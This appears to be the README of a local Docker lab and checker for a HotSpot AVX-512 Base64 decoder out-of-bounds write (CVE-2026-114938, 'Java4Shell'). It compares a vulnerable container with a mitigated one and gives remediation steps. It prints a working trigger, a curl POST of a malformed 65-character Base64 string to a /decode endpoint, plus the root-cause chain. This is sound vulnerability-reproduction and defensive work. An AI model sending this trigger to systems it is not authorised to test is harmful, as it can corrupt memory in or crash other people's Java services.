# Java4Shell (Java2Shell) - CVE-2026-114938 lab

[![CI](https://github.com/zake1god/java2shell/actions/workflows/ci.yml/badge.svg)](https://github.com/zake1god/java2shell/actions/workflows/ci.yml)

Reproducible, local-only checker and vulnerable-versus-mitigated Docker lab for
**CVE-2026-114938**, commonly called **Java4Shell** and sometimes
**Java2Shell**. The vulnerability is an out-of-bounds write in HotSpot's x86-64
AVX-512 Base64 decoder intrinsic.

> [!CAUTION]
> This repository contains an intentionally vulnerable Java runtime. The
> supplied services bind to `127.0.0.1` only. Never expose them to a public or
> shared network.

## Start here

Choose the result you need:

| I want to... | Run or read |
| --- | --- |
| Check whether my host can run the lab | `make preflight` |
| Run the complete vulnerable-versus-mitigated proof | `make verify` |
| Check the Java installed on this host | `make check` |
| Understand every step and output field | [Getting started](docs/GETTING-STARTED.md) |
| Read the Indonesian guide | [Panduan Bahasa Indonesia](docs/PANDUAN-ID.md) |
| Fix a zero result or Docker error | [Troubleshooting](docs/TROUBLESHOOTING.md) |
| Understand why this is not labelled a shell | [RCE and shell status](docs/RCE-STATUS.md) |
| Review public exploit claims | [Public exploit tracker](docs/PUBLIC-EXPLOIT-TRACKER.md) |

The shortest complete path is:

```bash
git clone https://github.com/zake1god/java2shell.git
cd java2shell
make preflight
make verify
```

## The result in 30 seconds

On an eligible host, the same pinned JDK image should produce:

```text
vulnerable service: changed_past_expected=62
mitigated service:  changed_past_expected=0
```

The vulnerable service runs the default Base64 intrinsic. The mitigated
service adds `-XX:-UseBASE64Intrinsics`. That A/B control is the central proof.

The final wrapper labels the evidence explicitly:

```text
verification_complete=true
evidence_level=bounded_oob_write_with_negative_control
shell_proven=false
```

`shell_proven=false` is not a failed lab. It means the public code proves the
native write and its mitigation, but does not install an unrelated command
endpoint and call that a Java4Shell exploit.

## What this repository proves

| Evidence | Proven here? | How |
| --- | :---: | --- |
| Exact vulnerable runtime | Yes | Eclipse Temurin `25.0.5+8`, pinned by image digest |
| Required CPU/runtime gate | Yes | `scripts/preflight.sh` and `tools/RuntimeProbe.java` |
| Unauthenticated HTTP reachability | Yes | Loopback-only `/decode` endpoint |
| Write past expected Base64 output | Yes | Sentinel bytes after offset 50 change |
| Negative control | Yes | Identical image with `-XX:-UseBASE64Intrinsics` |
| JVM crash | Not forced | The default lab keeps the write inside a 4 KiB array |
| Heap disclosure | No | No reader primitive is implemented |
| Arbitrary write | No | No general writer primitive is implemented |
| Application-specific RCE or shell | No | Product exploit implementations remain private |

Application-specific RCE is real: Calif published a Keycloak demonstration and
reports successful chains against several products. The same disclosure says
that the product exploit implementations are withheld. Public repositories
reviewed so far contain bounded reproducers, crash heuristics, experimental heap
work, separate command-injection sweeps, or synthetic command gates rather than
an independently reproducible product shell chain.

## Why the CPU matters

All of these conditions must line up:

1. an affected Java runtime;
2. x86-64 with `avx512f`, `avx512bw`, `avx512vbmi`, and `bmi2` visible to the JVM;
3. `UseBASE64Intrinsics` enabled;
4. attacker-controlled Base64 reaches `java.util.Base64.Decoder` after C2 JIT
   compilation.

ARM64 and x86-64 systems without the required AVX-512 features do not execute
this vulnerable path. Docker does not emulate missing CPU instructions.

Check the gate before building:

```bash
make preflight
```

Expected compatible result:

```text
arch=x86_64
cpu_gate=supported
docker_compose=available
docker_daemon=reachable
preflight_status=ready
next_step=make verify
```

See [Getting started](docs/GETTING-STARTED.md) for all preflight exit codes and
Windows/WSL2 instructions.

## Complete Docker verification

```bash
make verify
```

The command checks prerequisites, builds the image, starts both controls, waits
for readiness, sends the same bounded trigger, prints an interpretation, and
stops the lab even if a later step fails.

Expected HTTP results:

```text
[vulnerable container]
{"status":"reproduced","runtime":"25.0.5+8-LTS","input_length":65,"expected_output_size":50,"decoder_rejected":true,"changed_past_expected":62,"first_changed":50,"last_changed":111,"claim":"oob_write_only_not_shell"}
[mitigated control]
{"status":"not_reproduced","runtime":"25.0.5+8-LTS","input_length":65,"expected_output_size":50,"decoder_rejected":true,"changed_past_expected":0,"first_changed":-1,"last_changed":-1,"claim":"oob_write_only_not_shell"}
```

This output was observed on 2026-11-18 in WSL2 on an amd64 host exposing all
four required CPU flags.

### How to read the JSON

| Field | Meaning |
| --- | --- |
| `decoder_rejected` | Java rejected the malformed tail after the native path ran |
| `expected_output_size` | Logical Base64 output size for the malformed input |
| `changed_past_expected` | Sentinel bytes changed after that logical output |
| `first_changed` / `last_changed` | Range of the extra write, or `-1` if absent |
| `claim` | Scope of the proof; it deliberately does not say shell |

Both services report `decoder_rejected=true`. The difference is that the
vulnerable intrinsic has already changed memory before Java raises the
exception.

## Check an installed Java runtime

The local checker never contacts a remote host:

```bash
make check
```

Observed example:

```text
runtime=25.0.4+7-1-Debian
vendor=Debian
arch=amd64
cpu_gate=supported
version_assessment=known_affected_range
decoder_rejected=true
expected_output_size=50
changed_past_expected=62
first_changed=50
last_changed=111
result=VULNERABLE_BEHAVIOR_REPRODUCED
```

Exit codes:

| Code | Meaning |
| ---: | --- |
| `0` | Vulnerable write not reproduced |
| `1` | Checker error or Java missing |
| `2` | Writes past the expected output reproduced |

Exit `2` is the positive vulnerable-behavior result, not a checker crash.

## Decision table

| Vulnerable | Mitigated | Verdict |
| ---: | ---: | --- |
| `62` | `0` | Expected vulnerable behavior plus clean mitigation control |
| `0` | `0` | Path did not reproduce; check CPU, architecture, runtime, and flags |
| `62` | `62` | Mitigation is not effective or was not applied |
| Other | Any | Inconclusive; preserve output and follow troubleshooting |

An HTTP `400`, `401`, `500`, timeout, or reset from a remote service is not a
substitute for this comparison. Response codes do not reveal the target CPU,
JVM flags, or whether the native write occurred.

## Manual HTTP proof

The JDK 25 container uses 64 `A` characters followed by one `=`:

```bash
docker compose up --detach --build

payload="$(printf 'A%.0s' {1..64})="

curl --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8080/decode

curl --request POST \
  --header 'Content-Type: text/plain' \
  --data-binary "$payload" \
  http://127.0.0.1:8081/decode

docker compose down --remove-orphans
```

The endpoint accepts only the two public bounded trigger shapes. It has no
command parameter, reverse shell, or product-specific exploit.

## Root cause summary

```text
malformed Base64 tail
  -> C2 selects the x86-64 AVX-512 intrinsic
  -> tail output size underflows
  -> BZHI leaves a full-width store mask
  -> VMOVDQU8 writes 64 bytes from offset 48
  -> 62 bytes land after the expected 50-byte output
  -> Java rejects the input after the write
```

The lab uses a 4 KiB destination array filled with `0x5a`. Every machine write
therefore stays inside a real Java array while changes after the logical output
remain measurable. Read [Technical notes](docs/TECHNICAL.md) for the detailed
calculation.

## RCE and shell status

The evidence boundary is:

```text
public and reproduced here: input -> decoder -> OOB write -> mitigation control
publicly demonstrated elsewhere: application-specific RCE video and report
not public source code: reusable Keycloak/Jenkins/product shell chain
```

A valid future shell promotion must show a benign target-side command caused by
the CVE path, fail against a patched or mitigated control, and avoid a separate
command-injection endpoint or purpose-built role bit. The exact promotion gate
is documented in [RCE and shell status](docs/RCE-STATUS.md).

## Remediation

Upgrade through the JDK or product vendor and restart every JVM. The November
2026 fixed OpenJDK update lines are:

- `17.0.21.1`
- `21.0.13.1`
- `25.0.5.1`
- `27.0.1.1`

Oracle also lists the special `8u511b33-perf` build as affected by this CVE.
Do not classify generic Java 8 or 11 installations from the major version
alone; follow the runtime vendor's advisory.

Temporary narrow mitigation:

```bash
export JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"
```

Rebuild container images and restart every process after updating. Confirm the
actual runtime and effective flags of the running JVM rather than trusting a
tag, package name, or SBOM alone.

## Repository map

| Path | Purpose |
| --- | --- |
| `docs/GETTING-STARTED.md` | Full first-run walkthrough and output guide |
| `docs/PANDUAN-ID.md` | Panduan langkah demi langkah dalam Bahasa Indonesia |
| `docs/TROUBLESHOOTING.md` | CPU, Docker, flag, port, and verdict troubleshooting |
| `app/LabServer.java` | Bounded loopback-oriented HTTP lab service |
| `tools/RuntimeProbe.java` | Local runtime, CPU, and bounded probe checker |
| `compose.yaml` | Vulnerable and mitigated controls |
| `scripts/preflight.sh` | Prerequisite and hardware gate |
| `scripts/verify.sh` | Complete build, A/B verification, and cleanup |
| `scripts/demo.sh` | Side-by-side HTTP requests and interpretation |
| `tools/crawl_public_repos.py` | Read-only GitHub metadata crawler |
| `docs/TECHNICAL.md` | Root cause and evidence levels |
| `docs/RCE-STATUS.md` | Boundary between OOB, DoS, RCE, and shell |
| `docs/PUBLIC-EXPLOIT-TRACKER.md` | Commit-pinned audit of public claims |
| `docs/REFERENCES.md` | Primary and high-confidence sources |

## Public research snapshot

The read-only query below found 54 matching repositories at
2026-11-18 05:45 UTC:

```bash
make research
```

The count includes scanners, news mirrors, WAF rules, defensive tools,
reproducers, and unrelated repositories whose README mentions the CVE. A
repository count is not an exploit count. See the
[public exploit tracker](docs/PUBLIC-EXPLOIT-TRACKER.md) for manual review.

## Bahasa Indonesia

Mulai dengan:

```bash
make preflight
make verify
```

Hasil yang diharapkan adalah `62` byte berubah pada container rentan dan `0`
pada kontrol mitigasi. Jika keduanya `0`, periksa arsitektur dan empat flag CPU;
Docker tidak dapat membuat AVX-512 yang tidak tersedia pada host.

Repo ini membuktikan OOB write dengan kontrol negatif yang bersih. RCE
aplikasi-spesifik memang sudah didemonstrasikan, termasuk pada Keycloak, tetapi
source chain produk tersebut belum dipublikasikan. Repo tidak mengubah crash,
HTTP `401/500`, endpoint command terpisah, atau role bit sintetis menjadi klaim
shell.

Use only on systems you own or are explicitly authorized to test.
